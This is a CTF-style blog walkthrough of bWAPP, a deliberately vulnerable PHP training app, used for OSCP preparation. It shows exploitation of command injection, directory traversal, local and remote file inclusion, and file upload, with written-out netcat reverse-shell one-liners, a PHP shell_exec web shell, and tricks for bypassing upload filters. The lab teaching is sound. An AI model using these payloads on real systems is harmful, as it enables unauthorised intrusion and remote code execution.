---
title: bWAPP 2023 Edition
author: alex
date: Sun 16 Jul 17:37:41 CEST 2023
categories: [Web]
tags: [bwapp, ctf, walkthroughs, web hacking]
img_path: /assets/img/posts/2023-07-16-bwapp-2023-walkthrough/
image:
  path: bwapp.png
  alt: bWAPP Logo.
---

**bWAPP**, or *buggy web application*, is a free and open source deliberately insecure web application, something similar to **[DVWA](https://github.com/digininja/DVWA)**. bWAPP helps us prepare to conduct successful penetration testing and ethical hacking tasks.

**bWAPP** has over 100 web vulnerabilities and it covers all major known web bugs, including all risks from the **[OWASP Top 10 project](https://owasp.org/www-project-top-ten/)** so it's perfect to help us prepare the **web app testing part** of the **[OSCP](/posts/oscpath/)**. 

**bWAPP** is a **PHP** application that uses a **MySQL** database. It can be hosted on Linux/Windows or another possibility is to download **[bee-box]()**, a custom Linux VM pre-installed with bWAPP.

I decided to go for the **bee-box**. To get it running, just host it in **VirtualBox** as another VM and connect it to a secure innet -- **[here](https://github.com/amtzespinosa/secure-network-for-ctf)**'s a repo where I explain how to set a secure network for vulnerable VMs.

Once running you'll be able to access the webapp from your Kali Linux VM by typing its IP in the browser. Head to the **bWAPP** directory and log in with the user **bee** and the password **bug**.

Once inside we can see a dropdown menu to select the vulnerability we want to test and the level of security.

## A1 - Injection

### OS Command Injection

We are presented with an input field that says *DNS Lookup*. This means that we will perform an `nslookup`, I assume, on the domain that we enter in the input field. If there is no filtering, we should be able to concatenate and execute other commands.

#### Low

No filtering at all. So we can use `;` to concatenate another command: `www.nsa.gov; cat /etc/passwd`. This will print the `passwd` file after the `nslookup` failed output. As a PoC let's try to get a shell. We have two ways:

1. Concatenate the command: `www.nsa.gov; nc -e /bin/sh 192.168.1.23 1234`
2. Or... remember that `shell.php.png`? We can execute it as well: `www.nsa.gov; cd images; php shell.php.png`

#### Medium

Now we have a bit of filtering. If we try to concatenate commands using `;` we'll get nothing. But we can do the same with `|`. So just replace `;` with `|` and it will do the job: `www.nsa.gov | nc -e /bin/sh 192.168.1.23 1234`.

## A7 - Missing Functional Level Access Control 

The missing function level access control vulnerability allows users to perform functions that should be restricted, or lets them access resources that should be protected. 

Normally, functions and resources are directly protected in the code or by configuration settings, but it's not always easy to do correctly. Implementing proper checks can be difficult because modern applications often contain many types of roles and groups, plus a complex user hierarchy.

### Directory Traversal - Directories

Once inside the directory of this vulnerability we can see some files. Taking a look to the URL we see that this files are in the `documents` directory. Our mission is to acess other directories that are not supposed to be accesible.

#### Low

This is the last part of the URL: `/directory_traversal_2.php?directory=documents`. It shows we are in the `documents` directory. Now, let's try to change `documents` for another directory: `/etc`.

As soon as we change it and hit `Enter`, we can see the files inside the `/etc` directory.

![Directory Traversal /etc](dt-etc.png)

#### Medium

Same as before: `/directory_traversal_2.php?directory=/root`

### Directory Traversal - Files

*Try to climb higher Spidy...*

#### Low

This is the last part of the URL: `/directory_traversal_1.php?page=/etc/passwd`. THe page displays a message that, according to the URL is written in a document: `message.txt`. Now, let's try to change it to another document: `/etc/passwd`.

As soon as we change it and hit `Enter`, we can see the content inside the `/etc/passwd` file.

![Directory Traversal /etc/passwd](dt-etc-passwd.png)

#### Medium

Same as before but let's try to read other user's files: `/directory_traversal_1.php?page=/home/ftp/welcome.msg`

![Directory Traversal /home/ftp/welcome.msg](dt-home-ftp-welcome.png)

### Local File Inclusion

We are presented with a dropdown menu to select a language...

#### Low

If we select one of them and hit `Go`, we can see that the URL changes to execute a file: `lang_en.php`. With this in mind we can start playing around. First we can test to see if it is vulnerable: `/rlfi.php?language=../../../../etc/passwd`. As you can see for the output, it is. But this is just a test like in `Directory Traversal`. Let's try to do something using **PHP Wrappers**...

If we fire up **BurpSuite** we can modify the request to do some bad stuff. First let's see what files we can execute. Here is the basic methodology to do so:

1. Intercept the request with **BurpSuite**.
2. At the top, modify the `GET` request from: `/bWAPP/rlfi.php?language=lang_en.php&action=go` to `/bWAPP/rlfi.php?language=php://input&cmd=ls&action=go`. Here we are adding the **Input PHP Wrapper:** `php://input` to execute a command: `ls`. 
3. At the bottom, add the **PHP** code to execute that command: `<?php echo shell_exec($_GET['cmd']);?>`.
4. Forward the modify request and there you go, now you can see all the files.

![LFI BurpSuite](lfi-burp.png)

Going further, we can get a reverse shell. To do so, start a listener in you **Kali VM** with: `nc -nlvp [YOUR IP] 1234`. Once you are listening, change the previous request to: `/bWAPP/rlfi.php?language=php://input&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+[YOUR IP]+1234+>/tmp/f&action=go`. This is basically a **Netcat** command that throws a Reverse Shell to our IP.

![LFI Shell](lfi-shell.png)

This way we can exploit **LFI Vulnerabilities**. 

### Remote File Inclusion

#### Low

What if instead of executing the code through **BurpSuite** like this we just make the server execute a remote file with malitious code? Sounds good? Let's get to it!

1. Disable **PHP** execution in your apache server running `sudo /usr/sbin/a2dismod php8.2` -- I'll explain this later.
2. Start apache with `sudo service apache2 start`.
3. Create the file that would be executed. I will go for a reverse shell:

```php
<?php
echo shell_exec("nc -e /bin/sh 192.168.1.23 1234");
?>
```

4. Put this file into `/var/www/html`.
5. Start your **Netcat** listener with `nc -nlvp [YOUR IP] 1234`
5. Now, make the server execute this file changing the URL: `/bWAPP/rlfi.php?language=http://[YOUR KALI IP]/shell.php&action=go`. As you can see we have replaced the local file `lang_en.php` for our remote file `shell.php` preceded by our server address.

![RFI URL](rfi-url.png)

As you can see, we get a shell! Now you can enable **PHP** execution again with `sudo /usr/sbin/a2enmod php8.2` and restarting apache with `sudo /etc/init.d/apache2 restart` will make everything back to normality. 

![RFI Shell](rfi-shell.png)

What happens if we don't disable **PHP**? Well, long story short, the victim server will request the file `shell.php` but it will be executed in **OUR** server so we will get a reverse shell to our own machine! 

![RFI Auto Shell](rfi-auto-shell.png)

## Other Bugs

### File Upload

#### Low

Pretty easy as there is no restriction. We just need to start a listener with `sudo nc -nlvp 1234` and upload a **PHP** reverse shell. As soon as you visit the **URL** provided you'll trigger the shell.

![File Upload Shell](fu-shell.png)

#### Medium 

Now we start facing some restrictions. As we can see if we try to upload the same file with the `.php` extension the page will throw us an error: *Sorry, the file extension is not allowed. The following extensions are blocked: asp, aspx, dll, exe, jsp, php*. So now we know what extensions are illegal.

To by pass this restriction we only need to change the file extension from `.php` to `.php3`. This way we will be able to upload it and execute it as before.

#### High

I consider this level partially exploited as we need to use the **low security level of LFI** to be able to bypass the security and get a shell. First we have to change the file extension from `.php` to `.php.png`. This way we will be able to upload the file but we won't be able to execute ir clicking the link provided. So, copying the link address of the file and heading to the low level security LFI and changing the language file of the URL for our shell URL, would do the job.

`http://[YOUR KALI IP]/bWAPP/rlfi.php?language=http://[YOUR KALI IP]/bWAPP/images/shell.php.png&action=go`.

This is although a pretty real scenario. The majority of exploiting situations are a chain of vulnerabilities exploited that gradually allows you to make your way inside your taget.

